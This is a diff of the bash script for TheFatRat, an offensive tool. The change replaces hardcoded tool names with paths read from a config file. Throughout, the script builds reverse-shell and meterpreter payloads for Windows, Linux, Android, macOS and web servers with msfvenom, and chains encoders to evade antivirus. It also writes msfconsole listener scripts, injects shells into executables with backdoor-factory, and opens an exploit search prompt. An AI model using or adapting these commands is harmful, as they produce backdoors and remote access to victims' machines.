@@ -1,5 +1,15 @@
 #!/usr/bin/env bash
-
+file="config.path"
+if [ -f "$file" ]
+then
+msfconsole=`sed -n 4p config.path`	
+msfvenom=`sed -n 5p config.path`
+backdoor=`sed -n 6p config.path`
+searchsploit=`sed -n 7p config.path`
+else
+	echo "$file does not exists , run setup.sh first ."
+exit 1
+fi
 #============================================================================================================
 #	THEFATRAT
 #
@@ -224,7 +234,7 @@ sleep 2
     fi
 
 # check msfconsole
-      which msfconsole > /dev/null 2>&1
+      which $msfconsole > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
       echo [✔]::[msfconsole]: installation found!;
 else
@@ -237,7 +247,7 @@ fi
 sleep 2
 
 # check if msfvenom exists
-      which msfvenom > /dev/null 2>&1
+      which $msfvenom > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
       echo [✔]::[msfvenom]: installation found!;
 else
@@ -288,7 +298,7 @@ sleep 2
 
 
 # check backdoor-factory if exists
-      which backdoor-factory > /dev/null 2>&1
+      which $backdoor > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
       echo [✔]::[backdoor-factory]: installation found!;
 
@@ -501,7 +511,7 @@ echo ""
 				spinlong
 				echo ""
 				echo ""
-         			msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > output/$fira.elf
+         			$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f elf > output/$fira.elf
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '2'
 				then
@@ -516,7 +526,7 @@ echo ""
 				spinlong
 				echo ""
 				echo ""
-				msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o output/$fira.exe
+				$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | $msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | $msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| $msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | $msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o output/$fira.exe
 				echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '3'
 				then
@@ -531,7 +541,7 @@ echo ""
 				spinlong
 				echo ""
 				echo ""
-				msfvenom -p android/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.apk
+				$msfvenom -p android/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.apk
 				echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '4'
 				then
@@ -546,7 +556,7 @@ echo ""
 				spinlong
 				echo ""
 				echo ""
-         			msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > output/$fira.macho
+         			$msfvenom -p osx/x86/shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f macho > output/$fira.macho
           			echo -e "Shell Saved To outputFolder "
 			elif test $fatrat1 == '5'
 				then
@@ -561,7 +571,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.php
+         			$msfvenom -p php/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.php
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '6'
 				then
@@ -576,7 +586,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > output/$fira.asp
+         			$msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f asp > output/$fira.asp
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '7'
 				then
@@ -591,7 +601,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.jsp
+         			$msfvenom -p java/jsp_shell_reverse_tcp LHOST=$yourip LPORT=$yourport -f raw > output/$fira.jsp
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '8'
 				then
@@ -621,7 +631,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > output/$fira.py
+         			$msfvenom -p cmd/unix/reverse_python LHOST=$yourip LPORT=$yourport -f raw > output/$fira.py
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '10'
 				then
@@ -636,7 +646,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > output/$fira.sh
+         			$msfvenom -p cmd/unix/reverse_bash LHOST=$yourip LPORT=$yourport -f raw > output/$fira.sh
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '11'
 				then
@@ -651,7 +661,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > output/$fira.pl
+         			$msfvenom -p cmd/unix/reverse_perl LHOST=$yourip LPORT=$yourport -f raw > output/$fira.pl
           			echo -e "Shell Saved To output Folder "
 
      			elif test $fatrat1 == '12'
@@ -776,7 +786,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_linux.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_linux.rc"
            	 		echo exploit -j  >> "temp/meterpreter_linux.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_linux.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_linux.rc" &
 				clear
 			elif test $fatrat1 == '2' #Windows
 				then
@@ -794,7 +804,7 @@ echo -e $okegreen"  ============================================================
 				echo set AutoRunScript multi_console_command -rc $path/postexploit/$pe >> "temp/meterpreter_windows.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_windows.rc"
            	 		echo exploit -j  >> "temp/meterpreter_windows.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_windows.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_windows.rc" &
 				clear
 			elif test $fatrat1 == '3'  #Mac
 				then
@@ -809,7 +819,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_mac.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_mac.rc"
            	 		echo exploit -j  >> "temp/meterpreter_mac.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_mac.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_mac.rc" &
 				clear
 
 			elif test $fatrat1 == '4' #Android
@@ -826,7 +836,7 @@ echo -e $okegreen"  ============================================================
            	 		echo set LPORT $uservar >> "temp/meterpreter_android.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_android.rc"
            	 		echo exploit -j  >> "temp/meterpreter_android.rc"
-           	 		xterm -fa monaco -fs 13 -bg black -e msfconsole -r "temp/meterpreter_android.rc" &
+           	 		xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_android.rc" &
 				clear
 
 			elif test $fatrat1 == '5'
@@ -1493,8 +1503,8 @@ clear
 
 # User options
 PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
-MSFVENOM=`which msfvenom` # Path to the msfvenom script
-MSFCONSOLE=`which msfconsole` # Path to the msfconsole script
+MSFVENOM=`$msfvenom` # Path to the msfvenom script
+MSFCONSOLE=`$msfconsole` # Path to the msfconsole script
 
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
@@ -1878,7 +1888,7 @@ menu () {
   				spinlong2
   				echo ""
   				echo -e $okegreen""
-  				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
+  				$backdoor -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
                                   echo -e "Shell Saved To /backdoored/output/  press any key to continue"
   				read bebeku
   				clear
@@ -1898,7 +1908,7 @@ menu () {
 
   		elif test $fatrat == '8'
    			then
-   			xterm -fa monaco -fs 13 -bg black msfconsole
+   			xterm -fa monaco -fs 13 -bg black $msfconsole
 
   		elif test $fatrat == '9'
    			then
@@ -1906,7 +1916,7 @@ menu () {
    			echo -e "\033[31mWhat do you want to Hack Today?\033[m"
   			echo -e "\033[31mEnter a search term and hit Enter\033[m"
   			read searchterm
-  			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
+  			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "$searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
   			menu
 
       elif test $fatrat == '10'
@@ -2076,7 +2086,7 @@ echo
 				spinlong2
 				echo ""
 				echo -e $okegreen""
-				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
+				$backdoor -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
                                 echo -e "Shell Saved To /backdoored/output/  press any key to continue"
 				read bebeku
 				clear
@@ -2096,7 +2106,7 @@ echo
 
 		elif test $fatrat == '8'
  			then
- 			xterm -fa monaco -fs 13 -bg black msfconsole
+ 			xterm -fa monaco -fs 13 -bg black $msfconsole
 
 		elif test $fatrat == '9'
  			then
@@ -2104,7 +2114,7 @@ echo
  			echo -e "\033[31mWhat do you want to Hack Today?\033[m"
 			echo -e "\033[31mEnter a search term and hit Enter\033[m"
 			read searchterm
-			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
+			gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "$searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
 			menu
 
     elif test $fatrat == '10'
